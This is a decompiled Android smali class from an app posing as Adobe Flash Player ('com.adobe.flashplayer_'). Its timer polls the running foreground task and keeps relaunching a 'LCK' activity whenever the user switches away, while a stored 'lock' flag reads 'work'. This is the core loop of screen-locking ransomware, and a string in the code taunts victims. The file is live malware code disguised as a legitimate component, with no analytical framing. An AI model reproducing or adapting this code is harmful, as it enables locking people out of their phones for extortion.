.class Lcom/adobe/flashplayer_/BBB111$1;
.super Landroid/os/CountDownTimer;
.source "BBB111.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/flashplayer_/BBB111;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/flashplayer_/BBB111;


# direct methods
.method constructor <init>(Lcom/adobe/flashplayer_/BBB111;JJ)V
    .locals 0
    .param p2, "$anonymous0"    # J
    .param p4, "$anonymous1"    # J

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/flashplayer_/BBB111$1;->this$0:Lcom/adobe/flashplayer_/BBB111;

    .line 36
    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 1

    .prologue
    .line 74
    iget-object v0, p0, Lcom/adobe/flashplayer_/BBB111$1;->this$0:Lcom/adobe/flashplayer_/BBB111;

    invoke-virtual {v0}, Lcom/adobe/flashplayer_/BBB111;->stopSelf()V

    .line 75
    return-void
.end method

.method public onTick(J)V
    .locals 8
    .param p1, "millisUntilFinished"    # J

    .prologue
    .line 40
    iget-object v6, p0, Lcom/adobe/flashplayer_/BBB111$1;->this$0:Lcom/adobe/flashplayer_/BBB111;

    const-string v7, "activity"

    invoke-virtual {v6, v7}, Lcom/adobe/flashplayer_/BBB111;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    .line 41
    .local v1, "am":Landroid/app/ActivityManager;
    const/4 v6, 0x1

    invoke-virtual {v1, v6}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v5

    .line 42
    .local v5, "taskInfo":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    const/4 v6, 0x0

    invoke-interface {v5, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v2, v6, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    .line 44
    .local v2, "ci":Landroid/content/ComponentName;
    new-instance v4, Landroid/content/Intent;

    iget-object v6, p0, Lcom/adobe/flashplayer_/BBB111$1;->this$0:Lcom/adobe/flashplayer_/BBB111;

    invoke-virtual {v6}, Lcom/adobe/flashplayer_/BBB111;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    const-class v7, Lcom/adobe/packages/LCK;

    invoke-direct {v4, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 47
    .local v4, "intent":Landroid/content/Intent;
    iget-object v6, p0, Lcom/adobe/flashplayer_/BBB111$1;->this$0:Lcom/adobe/flashplayer_/BBB111;

    const-string v7, "lock"

    invoke-static {v6, v7}, Lcom/adobe/flashplayer_/BBB111;->access$0(Lcom/adobe/flashplayer_/BBB111;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "stop"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 48
    const-string v0, "Hello fucksters!!! i will have you, fuckers!lmao!"

    .line 49
    .local v0, "Av":Ljava/lang/String;
    iget-object v6, p0, Lcom/adobe/flashplayer_/BBB111$1;->this$0:Lcom/adobe/flashplayer_/BBB111;

    invoke-virtual {v6}, Lcom/adobe/flashplayer_/BBB111;->stopSelf()V

    .line 53
    .end local v0    # "Av":Ljava/lang/String;
    :cond_0
    invoke-virtual {v2}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v6

    const-string v7, "com.adobe"

    invoke-virtual {v6, v7}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v6

    const/4 v7, -0x1

    if-ne v6, v7, :cond_1

    iget-object v6, p0, Lcom/adobe/flashplayer_/BBB111$1;->this$0:Lcom/adobe/flashplayer_/BBB111;

    const-string v7, "lock"

    invoke-static {v6, v7}, Lcom/adobe/flashplayer_/BBB111;->access$0(Lcom/adobe/flashplayer_/BBB111;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "work"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_1

    .line 54
    const/4 v3, 0x1

    .line 56
    .local v3, "ff":Z
    const-string v6, "android.intent.action.VIEW"

    invoke-virtual {v4, v6}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 57
    const/high16 v6, 0x4000000

    invoke-virtual {v4, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 58
    const/high16 v6, 0x40000000    # 2.0f

    invoke-virtual {v4, v6}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 59
    const/high16 v6, 0x10000000

    invoke-virtual {v4, v6}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 60
    iget-object v6, p0, Lcom/adobe/flashplayer_/BBB111$1;->this$0:Lcom/adobe/flashplayer_/BBB111;

    invoke-virtual {v6, v4}, Lcom/adobe/flashplayer_/BBB111;->startActivity(Landroid/content/Intent;)V

    .line 71
    .end local v3    # "ff":Z
    :cond_1
    return-void
.end method
